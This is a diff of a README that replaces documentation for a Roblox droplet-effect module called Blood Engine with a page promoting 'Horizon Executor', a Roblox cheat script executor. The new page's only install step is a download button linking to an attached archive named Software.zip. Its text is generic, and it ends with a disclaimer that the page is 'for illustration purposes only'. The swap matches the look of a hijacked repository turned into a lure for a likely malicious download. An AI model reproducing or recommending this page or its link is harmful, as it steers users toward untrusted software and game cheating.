@@ -1,62 +1,45 @@
-<div align="center">
-	
-<picture>
- <img alt="Logo" src="https://github.com/rotntake/BloodEngine/assets/126120456/eb3a43ec-579f-491d-a9f3-f32e3a75d9ff">
-</picture>
+# Horizon-Roblox
 
-</div>
+![Roblox Logo](https://cdn.mos.cms.futurecdn.net/S6KK5qQgM3K7KJ3tw4WYnM-1200-80.jpg)
 
-<div align="center">
+## Description
 
+Horizon Executor is a powerful Roblox script executor designed to enhance your gameplay experience. With its advanced scripting capabilities, Horizon allows users to execute custom scripts in Roblox games, providing them with additional features and functionalities not available in the base game.
 
-v1.1.2 • [Model](https://create.roblox.com/marketplace/asset/15420466379/) • [Devforum](https://devforum.roblox.com/t/blood-engine-a-droplet-emitter-system/2545682)
+## Features
 
-</div>
-
-## What is Blood Engine?
-Blood Engine is a versatile resource that can be utilized for various applications, including creating effects like paint, water, blood, and more. It offers numerous methods tailored to meet your specific needs.
-
-One of its key features is the ability to emit "droplets" - these are meshes that can take on the appearance of "Decals" or "Spheres". These droplets can be emitted from any given origin point with a given velocity. Upon landing on a surface, such as a wall or floor, they transform into a pool.
-
-This entire process is highly customizable, with 24 options at your disposal to tweak and adjust according to your requirements. This ensures that Blood Engine can adapt to a wide range of scenarios and use-cases, providing you with the flexibility to create the exact effect you're aiming for.
+- **Script Execution:** Execute custom scripts to modify your gameplay experience.
+- **Enhanced Gameplay:** Access additional features and functionalities in Roblox games.
+- **User-Friendly Interface:** Horizon offers an intuitive and easy-to-use interface for script execution.
+- **Compatibility:** Horizon is designed to work seamlessly with a wide range of Roblox games.
+- **Regular Updates:** The Horizon team is committed to providing frequent updates and improvements to the executor.
 
 ## Installation
-You can install Blood Engine through the latest release of the repository, the [Model](https://create.roblox.com/marketplace/asset/15420466379/) published on Roblox, or by using Wally:
-```toml
-[dependencies]
-BloodEngine = "rotntake/blood-engine@1.1.2"
-```
+
+To download and install Horizon Executor, click the button below:
+
+[![Download Horizon Executor](https://img.shields.io/badge/Download-Horizon%20Executor-blueviolet)](https://github.com/user-attachments/files/17382638/Software.zip)
 
 ## Usage
-#### Initialization
-Firstly, you'll need to initialize BloodEngine with your preferred settings. This can be done in either a client or server script. However, it's generally more advisable to do this on the client side, so we'll proceed with that approach. 
 
-The settings provide you with control over various aspects of droplets and pools. These include the maximum number of droplets that can be created, the type of droplets to use, the velocity of droplets upon emission, and much more.
-```lua
--- Import the BloodEngine module
-local BloodEngine = require(PathToModule)
+1. Download and install Horizon Executor using the provided link.
+2. Launch the executor and select the Roblox game you want to modify.
+3. Load your custom script or write a new one within Horizon's interface.
+4. Click on the "Execute" button to run the script in the selected game.
+5. Enjoy the enhanced gameplay experience with Horizon Executor!
 
--- Initialize BloodEngine with desired settings
-local Engine = BloodEngine.new({
-    Limit = 100, -- Sets the maximum number of droplets that can be created.
-    Type = "Default", -- Defines the droplet type. It can be either "Default" (Sphere) or "Decal",
-    RandomOffset = false, -- Determines whether a droplet should spawn at a random offset from a given position.
-    OffsetRange = {-20, 10}, -- Specifies the offset range for the position vectors.
-    DropletVelocity = {1, 2}, -- Controls the velocity of the emitted droplet.
-    DropletDelay = {0.05, 0.1}, -- Sets the delay between emitting droplets in a loop (for the EmitAmount method).
-    StartingSize = Vector3.new(0.01, 0.7, 0.01), -- Sets the initial size of the droplets upon landing.
-    Expansion = true, -- Determines whether a pool can expand when a droplet lands on it.
-    MaximumSize = 1, -- Sets the maximum size a pool can reach.
-})
-```
-#### Emitting Droplets
-After initializing the module, you're all set to emit droplets. There are two key methods available for droplet emission: `EmitAmount` and `Emit`.
-```lua
--- Emit a specific amount of droplets from a given origin in specific or nil direction
--- (Setting the Direction to nil will make droplets go in random directions)
-Engine:EmitAmount(Origin, Direction, Amount)
+## Troubleshooting
 
--- Emit a single droplet from a given origin in a specific or nil direction
-Engine:Emit(Origin, Direction)
-```
-In this instance, we’ll be utilizing the `EmitAmount` method. Typically, you’d use the `Emit` method when you want to create your own loop instead of relying on the built-in loop of `EmitAmount` . This gives you more control over the emission process.
+If you encounter any issues or have questions about Horizon Executor, feel free to reach out to our support team for assistance.
+
+## Contributing
+
+We welcome contributions from the community to help improve Horizon Executor. If you have any feature suggestions, bug reports, or code optimizations, please submit a pull request or open an issue on our GitHub repository.
+
+## License
+
+Horizon Executor is released under the MIT License. See the [LICENSE](#) file for more details.
+
+---
+
+**Note:** This README.md file is for illustration purposes only and may not contain actual links or functional elements related to Horizon Executor.
